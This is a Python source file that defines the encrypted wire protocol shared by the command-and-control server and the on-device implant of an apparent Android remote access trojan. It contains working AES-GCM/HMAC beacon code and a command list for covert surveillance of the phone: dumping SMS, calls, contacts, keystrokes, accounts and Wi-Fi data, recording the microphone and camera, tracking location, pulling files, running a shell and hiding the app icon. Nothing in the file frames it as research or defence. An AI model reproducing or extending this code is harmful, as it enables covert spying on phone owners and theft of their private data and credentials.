"""Wire protocol constants shared by the C2 and the on-device implant.

Envelope (JSON, UTF-8) for every request and response body::

    {"v": 1, "sid": "<uuid>", "n": "<b64 nonce>", "c": "<b64 ciphertext>", "h": "<hex hmac>"}

``c`` is AES-256-GCM(plaintext) with the 16-byte tag appended, ``h`` is
HMAC-SHA256 over ``v|sid|n|c``. Both keys are HKDF-SHA256 derivations of the
32-byte pre-shared key baked into the APK at build time. A body larger than
``MAX_BODY`` is refused before allocation so a hostile peer cannot exhaust the
C2 with a length lie.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import uuid
from typing import Any, Dict

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

PROTO_VERSION = 1
HKDF_SALT = b"hackit-rat-v1"
HKDF_INFO_AES = b"aes-256-gcm"
HKDF_INFO_MAC = b"hmac-sha256"
NONCE_LEN = 12
KEY_LEN = 32
TAG_LEN = 16
MAX_BODY = 8 * 1024 * 1024
MAX_TASK_ARGS = 24
MAX_TASK_ARG_LEN = 4096

# Beacon ops the server understands.
OP_REGISTER = "register"
OP_POLL = "poll"
OP_EVENT = "event"
OP_RESULT = "result"

# Task commands the implant dispatcher knows. Kept in one tuple so the builder
# and the README cannot drift from the dispatcher.
COMMANDS = (
    "ping",
    "info",
    "perm_status",
    "sms_dump",
    "sms_send",
    "calls_dump",
    "contacts_dump",
    "loc",
    "loc_track",
    "files_ls",
    "files_pull",
    "files_push",
    "clipboard_get",
    "clipboard_set",
    "notif_dump",
    "apps",
    "mic_rec",
    "cam_shot",
    "screenshot",
    "shell",
    "keylog_dump",
    "keylog_clear",
    "toast",
    "vibrate",
    "open_url",
    "wifi_dump",
    "accounts",
    "hide_icon",
)


class ProtocolError(Exception):
    """Malformed envelope, stale version, bad length or failed MAC."""


def hkdf(psk: bytes, info: bytes, length: int = KEY_LEN) -> bytes:
    """RFC 5869 HKDF-SHA256, single block (length <= 32)."""
    if length > 32:
        raise ValueError("hkdf length > 32 needs multiple blocks")
    prk = hmac.new(HKDF_SALT, psk, hashlib.sha256).digest()
    okm = hmac.new(prk, info + b"\x01", hashlib.sha256).digest()
    return okm[:length]


def aes_key(psk: bytes) -> bytes:
    return hkdf(psk, HKDF_INFO_AES)


def mac_key(psk: bytes) -> bytes:
    return hkdf(psk, HKDF_INFO_MAC)


def _tag(v: int, sid: str, nonce_b64: str, ct_b64: str) -> bytes:
    msg = f"{v}|{sid}|{nonce_b64}|{ct_b64}".encode("ascii")
    return msg


def seal(psk: bytes, sid: str, plaintext: bytes) -> Dict[str, Any]:
    """Encrypt + authenticate a payload into an envelope dict."""
    if len(plaintext) > MAX_BODY:
        raise ProtocolError(f"payload {len(plaintext)} > {MAX_BODY}")
    nonce = os.urandom(NONCE_LEN)
    ct = AESGCM(aes_key(psk)).encrypt(nonce, plaintext, None)
    n_b64 = base64.b64encode(nonce).decode("ascii")
    c_b64 = base64.b64encode(ct).decode("ascii")
    digest = hmac.new(mac_key(psk), _tag(PROTO_VERSION, sid, n_b64, c_b64), hashlib.sha256).hexdigest()
    return {"v": PROTO_VERSION, "sid": sid, "n": n_b64, "c": c_b64, "h": digest}


def open_envelope(psk: bytes, raw: bytes) -> Dict[str, Any]:
    """Verify MAC and decrypt an envelope. Raises ProtocolError on any doubt."""
    if len(raw) > MAX_BODY:
        raise ProtocolError(f"body {len(raw)} > {MAX_BODY}")
    try:
        env = json.loads(raw.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        raise ProtocolError(f"not json: {exc}") from exc
    if not isinstance(env, dict):
        raise ProtocolError("envelope is not an object")
    if env.get("v") != PROTO_VERSION:
        raise ProtocolError(f"version {env.get('v')!r} != {PROTO_VERSION}")
    sid, n_b64, c_b64, got = env.get("sid"), env.get("n"), env.get("c"), env.get("h")
    if not all(isinstance(x, str) for x in (sid, n_b64, c_b64, got)) or not sid:
        raise ProtocolError("envelope field missing")
    want = hmac.new(mac_key(psk), _tag(PROTO_VERSION, sid, n_b64, c_b64), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(want, got):
        raise ProtocolError("bad mac")
    try:
        nonce = base64.b64decode(n_b64, validate=True)
        ct = base64.b64decode(c_b64, validate=True)
    except ValueError as exc:
        raise ProtocolError(f"bad base64: {exc}") from exc
    if len(nonce) != NONCE_LEN or len(ct) < TAG_LEN:
        raise ProtocolError("bad nonce/tag length")
    try:
        plain = AESGCM(aes_key(psk)).decrypt(nonce, ct, None)
    except Exception as exc:  # InvalidTag and friends
        raise ProtocolError(f"decrypt failed: {exc}") from exc
    return {"sid": sid, "body": plain}


def pack(body: Dict[str, Any]) -> bytes:
    return json.dumps(body, separators=(",", ":")).encode("utf-8")


def new_sid() -> str:
    return str(uuid.uuid4())


def validate_task(task: Dict[str, Any]) -> Dict[str, Any]:
    """Clamp an operator-supplied task into the shape the implant expects."""
    cmd = str(task.get("cmd", "")).strip()
    if cmd not in COMMANDS:
        raise ProtocolError(f"unknown command {cmd!r}")
    raw_args = task.get("args") or []
    if not isinstance(raw_args, list) or len(raw_args) > MAX_TASK_ARGS:
        raise ProtocolError("args must be a list <= MAX_TASK_ARGS")
    args = []
    for arg in raw_args:
        text = str(arg)
        if len(text) > MAX_TASK_ARG_LEN:
            text = text[:MAX_TASK_ARG_LEN]
        args.append(text)
    return {"cmd": cmd, "args": args}
